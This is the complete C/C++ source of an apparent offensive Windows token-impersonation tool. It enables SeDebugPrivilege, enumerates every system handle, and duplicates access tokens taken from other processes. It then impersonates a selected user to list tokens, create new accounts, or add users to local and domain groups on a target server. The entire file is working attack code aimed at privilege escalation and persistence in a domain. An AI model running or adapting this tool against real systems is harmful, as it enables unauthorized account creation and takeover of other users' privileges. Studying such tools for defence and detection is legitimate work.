#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ntdll")

#define MAX_USERNAME_LENGTH 256
#define MAX_DOMAINNAME_LENGTH 256
#define FULL_NAME_LENGTH 271
#define TOKEN_TYPE_LENGTH 30
#define COMMAND_LENGTH 1000
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH             ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW                  ((NTSTATUS)0x80000005L)
#define SystemHandleInformation                 16
#define SystemHandleinformationize             1024 * 1024 * 10

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
}  SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE {
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG Inis_token_validAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG is_token_validAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING* POBJECT_NAME_INFORMATION;

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef struct {
    HANDLE token_handle;
    int token_id;
    DWORD token_session_id;
    wchar_t user_name[FULL_NAME_LENGTH];
    wchar_t TokenType[100];
    wchar_t TokenImpersonationLevel[100];
} TOKEN;


// Used to retrieve the session id of the targeted token
void get_token_token_session_id(TOKEN* TOKEN_INFO) {
    DWORD token_info, token_session_id;
    if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenSessionId, NULL, 0, &token_info)) {
        PTOKEN_OWNER TokenStatisticsInformation = (PTOKEN_OWNER)GlobalAlloc(GPTR, token_info);
        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenSessionId, &token_session_id, token_info, &token_info)) {
            TOKEN_INFO->token_session_id = token_session_id;
        }
    }
}

void get_token_user_info(TOKEN* TOKEN_INFO) {
    wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH], full_name[FULL_NAME_LENGTH];
    DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
    SID_NAME_USE sid;
    if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenUser, NULL, 0, &token_info)) {
        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenUser, TokenStatisticsInformation, token_info, &token_info)) {
            LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
            _snwprintf_s(full_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);
            wcscpy_s(TOKEN_INFO->user_name, TOKEN_TYPE_LENGTH, full_name);
        }
    }
}

void get_token_security_context(TOKEN* TOKEN_INFO) {
    DWORD returned_tokimp_length;
    if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length)) {
        PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)GlobalAlloc(GPTR, returned_tokimp_length);
        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length)) {
            if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityImpersonation) {
                wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityImpersonation");
            }
            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityDelegation) {
                wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityDelegation");
            }
            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityAnonymous) {
                wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityAnonymous");
            }
            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityIdentification) {
                wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityIdentification");
            }
        }
    }
}

void get_token_information(TOKEN* TOKEN_INFO) {
    DWORD returned_tokinfo_length;
    if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            if (TokenStatisticsInformation->TokenType == TokenPrimary) {
                wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenPrimary");
            }
            else if (TokenStatisticsInformation->TokenType == TokenImpersonation) {
                wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenImpersonation");
            }
        }
    }
}

LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass) {
    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    }
    if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL)) {
        data = (LPWSTR)calloc(pObjectInfo->Length, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Length);
    }
    free(pObjectInfo);
    return data;
}


int wmain(int argc, wchar_t* argv[]) {
    HANDLE hToken;
    DWORD cbSize;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);
    DWORD integrity_level = (DWORD)*GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

    if (integrity_level < SECURITY_MANDATORY_HIGH_RID) {
        printf("Ops, low privileges...\n");
        return 1;
    }

    TOKEN_PRIVILEGES tp;

    LUID luidSeDebugPrivivilege;
    printf("[?] Enabling SeDebugPrivilege\n");
    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivivilege) == 0) {
        printf("\t[!] SeDebugPrivilege not owned!\n");
    }
    else {
        printf("\t[*] SeDebugPrivilege owned!\n");
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luidSeDebugPrivivilege;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
        printf("\t[!] SeDebugPrivilege adjust token failed: %d\n", GetLastError());
    }
    else {
        printf("\t[*] SeDebugPrivilege enabled!\n");
    }

    CloseHandle(hProcess);
    CloseHandle(hToken);

    DWORD current_token_session_id;
    ProcessIdToSessionId(GetCurrentProcessId(), &current_token_session_id);

    ULONG returnLenght = 0;
    TOKEN found_tokens[100];
    int nbrsfoundtokens = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleinformationize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleinformationize, &returnLenght);
    for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];

        HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
        if (process == INVALID_HANDLE_VALUE) {
            CloseHandle(process);
            continue;
        }

        HANDLE dupHandle;
        if (DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0) {
            CloseHandle(process);
            continue;
        }

        POBJECT_TYPE_INFORMATION objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(8192);
        if (wcscmp(GetObjectInfo(dupHandle, ObjectTypeInformation), L"Token")) {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        TOKEN TOKEN_INFO;
        TOKEN_INFO.token_handle = dupHandle;
        get_token_user_info(&TOKEN_INFO);
        get_token_information(&TOKEN_INFO);
        get_token_token_session_id(&TOKEN_INFO);

        if (wcscmp(TOKEN_INFO.TokenType, L"TokenPrimary") != 0) {
            get_token_security_context(&TOKEN_INFO);
        }
        else {
            wcscpy_s(TOKEN_INFO.TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L" ");
        }

        int is_new_token = 0;
        for (int j = 0; j <= nbrsfoundtokens; j++) {
            if (wcscmp(found_tokens[j].user_name, TOKEN_INFO.user_name) == 0 && wcscmp(found_tokens[j].TokenType, TOKEN_INFO.TokenType) == 0 && wcscmp(found_tokens[j].TokenImpersonationLevel, TOKEN_INFO.TokenImpersonationLevel) == 0) {
                is_new_token = 1;
            }
        }

        if (is_new_token == 0) {
            TOKEN_INFO.token_id = nbrsfoundtokens;
            found_tokens[nbrsfoundtokens] = TOKEN_INFO;
            nbrsfoundtokens += 1;
        }
        CloseHandle(process);
    }

    if (wcscmp(argv[1], L"list") == 0) {
        for (int k = 0; k < nbrsfoundtokens; k++) {
            printf("[ID: %d][SESSION: %d][%ws][%ws] User: %ws\n", found_tokens[k].token_id, found_tokens[k].token_session_id, found_tokens[k].TokenType, found_tokens[k].TokenImpersonationLevel, found_tokens[k].user_name);
        }
    }
    else if ((wcscmp(argv[1], L"addtolocalgroup") == 0 && argc == 6) || (wcscmp(argv[1], L"addtodomaingroup") == 0 && argc == 6) || ((wcscmp(argv[1], L"adduser") == 0 && argc == 6))) {
        int selected_token = _wtoi(argv[2]);
        for (int k = 0; k < nbrsfoundtokens; k++) {
            if (found_tokens[k].token_id == selected_token) {
                HANDLE duplicated_token;
                if (DuplicateTokenEx(found_tokens[k].token_handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_token) != 0) {
                    if (wcscmp(argv[1], L"adduser") == 0) {

                        if (ImpersonateLoggedOnUser(duplicated_token) == 0) {
                            printf("[!] Failed with error: %d", GetLastError());
                            return 1;
                        }
                        NET_API_STATUS            err = 0;
                        DWORD                     parm_err = 0;
                        wchar_t* password = argv[4];
                        wchar_t* server = argv[5];
                        wchar_t* username = argv[3];
                        printf("lol\n");

                        USER_INFO_1 ui;
                        memset(&ui, 0, sizeof(ui));
                        ui.usri1_name = username;
                        ui.usri1_password = password;
                        ui.usri1_priv = USER_PRIV_USER;
                        ui.usri1_home_dir = NULL;
                        ui.usri1_comment = NULL;
                        ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
                        ui.usri1_script_path = NULL;

                        err = NetUserAdd(server, 1, (LPBYTE)&ui, &parm_err);          

                        switch (err)
                        {
                        case 0:
                            printf("User successfully created.\n");
                            break;
                        case NERR_UserExists:
                            printf("User already exists.\n");
                            err = 0;
                            break;
                        case ERROR_INVALID_PARAMETER:
                            printf("Invalid parameter error adding user; parameter index = %d\n",
                                parm_err);
                            NetApiBufferFree(argv[5]);
                            return(err);
                        default:
                            printf("Error adding user: %d\n", err);
                            NetApiBufferFree(argv[5]);
                            return(err);
                        }

                        RevertToSelf();
                       
                    }
                    if (wcscmp(argv[1], L"addtodomaingroup") == 0) {

                        if (ImpersonateLoggedOnUser(duplicated_token) == 0) {
                            printf("[!] Failed with error: %d", GetLastError());
                            return 1;
                        }

                        wchar_t* group = argv[4];
                        wchar_t* server = argv[5];
                        wchar_t* username = argv[3];

                        printf("[*] Adding user %ws to domain group %ws\n", username, group);
                        if (NetGroupAddUser(server, group, username) != 0) {
                            printf("[!] Add user in domain %ws failed with error: %d", server, GetLastError());
                            return 1;
                        }
                        printf("[*] Done!\n");
                        RevertToSelf();
                    }
                    if (wcscmp(argv[1], L"addtolocalgroup") == 0) {
                        NET_API_STATUS            err = 0;
                        if (ImpersonateLoggedOnUser(duplicated_token) == 0) {
                            printf("[!] Failed with error: %d", GetLastError());
                            return 1;
                        }

                        wchar_t* group = argv[4];
                        wchar_t* server = argv[5];

                        LOCALGROUP_MEMBERS_INFO_3 localgroup_members;
                        localgroup_members.lgrmi3_domainandname = argv[3];

                        err = NetLocalGroupAddMembers(server, group, 3, (LPBYTE)&localgroup_members, 1);

                        switch (err)
                        {
                        case 0:
                            printf("User successfully added to local group.\n");
                            break;
                        case ERROR_MEMBER_IN_ALIAS:
                            printf("User already in local group.\n");
                            err = 0;
                            break;
                        default:
                            printf("Error adding user to local group: %d\n", err);
                            break;
                        }
                        
                        RevertToSelf();
                    }
                    
                    CloseHandle(duplicated_token);
                }
                else {
                    printf("[!] Duplication failed with error: %d\n", GetLastError());
                    return 1;
                }
            }
        }
    }
    return 0;
}
